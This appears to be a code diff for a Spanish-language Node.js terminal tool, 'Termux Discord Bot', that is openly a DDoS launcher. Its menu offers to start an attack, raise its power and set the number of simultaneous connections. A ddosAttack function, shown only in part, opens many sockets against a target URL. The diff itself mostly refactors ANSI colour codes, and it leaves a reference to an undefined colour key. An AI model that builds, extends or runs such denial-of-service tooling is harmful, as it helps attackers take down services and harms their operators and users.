@@ -4,9 +4,45 @@ input: process.stdin,
 output: process.stdout
 });
 
+const colors = {
+reset: '[0m',
+bright: '[1m',
+dim: '[2m',
+underscore: '[4m',
+blink: '[5m',
+reverse: '[7m',
+hidden: '[8m',
+fg: {
+black: '[30m',
+red: '[31m',
+green: '[32m',
+yellow: '[33m',
+blue: '[34m',
+magenta: '[35m',
+cyan: '[36m',
+white: '[37m',
+},
+bg: {
+black: '[40m',
+red: '[41m',
+green: '[42m',
+yellow: '[43m',
+blue: '[44m',
+magenta: '[45m',
+cyan: '[46m',
+white: '[47m',
+},
+};
+
+const decorations = {
+underline: '[4m',
+bold: '[1m',
+italic: '[3m',
+};
+
 const ddosAttack = async (url, numConnections, attackDuration) => {
 try {
-console.log('[32mIniciando ataque DDoS...[0m');
+console.log(`${colors.fg.green}Iniciando ataque DDoS...${colors.reset}`);
 const sockets = [];
 for (let i = 0; i < numConnections; i++) {
 const socket = new net.Socket();
@@ -33,13 +69,13 @@ console.error(`Error: ${error}`);
 
 const updateCode = async () => {
 try {
-console.log('[32mActualizando código...[0m');
+console.log(`${colors.fg.green}Actualizando código...${colors.reset}`);
 const exec = require('child_process').exec;
 exec('git pull origin main', (error, stdout, stderr) => {
 if (error) {
 console.error(`Error: ${error}`);
 } else {
-console.log('[32mCódigo actualizado correctamente![0m');
+console.log(`${colors.fg.green}Código actualizado correctamente!${colors.reset}`);
 }
 });
 } catch (error) {
@@ -49,16 +85,16 @@ console.error(`Error: ${error}`);
 
 const showMenu = () => {
 console.clear(); // Limpiar la consola
-console.log('[32mBienvenido al Termux Discord Bot![0m');
-console.log(':')[33mDesarrollado por Keiji821[0m');
-console.log('[36m⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃[0m');
-console.log('[32m1. Iniciar ataque DDoS[0m');
-console.log('[36m2. Actualizar código desde GitHub[0m');
-console.log('[33m3. Configurar conexiones simultaneas[0m');
-console.log('[34m4. Aumentar potencia del ataque[0m');
-console.log('[31m5. Salir[0m');
-console.log('[36m⸌⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⸍[0m');
-rl.setPrompt(`[34m[1m ➤ `); // Establecer el texto de la casilla "Opción: "
+console.log(`${colors.fg.green}Bienvenido al Termux Discord Bot!${colors.reset}`);
+console.log(`${colors.fg.yellow}Desarrollado por Keiji821${colors.reset}`);
+console.log(`${colors.fg.cyan}⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃${colors.reset}`);
+console.log(`${colors.fg.green}1. Iniciar ataque DDoS${colors.reset}`);
+console.log(`${colors.fg.cyan}2. Actualizar código desde GitHub${colors.reset}`);
+console.log(`${colors.fg.yellow}3. Configurar conexiones simultaneas${colors.reset}`);
+console.log(`${colors.fg.green}4. Aumentar potencia del ataque${colors.reset}`);
+console.log(`${colors.fg.red}5. Salir${colors.reset}`);
+console.log(`${colors.fg.cyan}⸌⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⸍${colors.reset}`);
+rl.setPrompt(`${colors.fg.bright} ➤ ${colors.reset}`); // Establecer el texto de la casilla "Opción: "
 rl.prompt(); // Mostrar la casilla "Opción:"
 };
 
